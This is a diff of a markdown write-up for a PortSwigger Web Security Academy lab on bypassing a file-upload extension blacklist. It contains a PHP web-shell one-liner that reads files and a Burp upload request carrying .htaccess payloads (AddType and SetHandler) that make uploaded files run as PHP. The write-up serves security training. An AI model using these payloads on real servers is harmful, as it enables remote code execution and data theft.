@@ -1,5 +1,5 @@
 
-## Description 
+# Description 
 
 This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
 
@@ -7,7 +7,7 @@ To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the co
 
 You can log in to your own account using the following credentials: `wiener:peter`
 
-**Endpoints**
+####  Endpoints
 Homepage: https://0a48000b04f5708c80bd306b00f6005b.web-security-academy.net/
 Login : https://0a48000b04f5708c80bd306b00f6005b.web-security-academy.net/login
 My Account: https://0a48000b04f5708c80bd306b00f6005b.web-security-academy.net/my-account?id=wiener
@@ -17,7 +17,7 @@ File Upload Location: https://0a48000b04f5708c80bd306b00f6005b.web-security-acad
 
 
 
-#### Payload Crafting
+## Payload Crafting
 
 **Example Payloads from PortSwigger (PS)**
 `"<?php echo file_get_contents('/path/to/target/file'); ?>"`
@@ -28,7 +28,7 @@ File Upload Location: https://0a48000b04f5708c80bd306b00f6005b.web-security-acad
 Uploading this payload in a **.php** file results in a server error 
 `"Server Error: Gateway Timeout (0) connecting to 0ae000f3035e5448820038ef00df007f.web-security-academy.net"`
 
-#### Payload Process
+## Payload Process
 
 **Crafting the payload saving it to a file and via burp the /my-account endpoint is visited and the file is uploaded**
 ![[obscure_filename.png]]
@@ -53,12 +53,14 @@ Uploading **.html** works
 **Response**
 The shell is served statically
 
-#### Hint
+## Hint
+
+You need to upload two different files to solve this lab.
+
 
 **Uploading .htaccess**
-`"AddType application/x-httpd-php .l33t"`
-
-![[uploading_.htaccess.png]]
+This approach is very aggressive and will affect all other user's images on the server. 
+`"SetHandler application/x-httpd-php "`
 
 **Changing Upload Request**
 
@@ -66,8 +68,13 @@ The shell is served statically
 "Content-Disposition: form-data; name="avatar"; filename=".htaccess"
 Content-Type: text/plain
 
-AddType application/x-httpd-php .l33t"
+SetHandler application/x-httpd-php"
 ```
 
-![[updated_burp_request.png]]
+**Response**
+Server responds with 200 OK and afterwards calling the image previously uploaded with a GET request will execute the .php script and the secret will be sent
+
+
+![[secret_retrieved.png]]
+
 
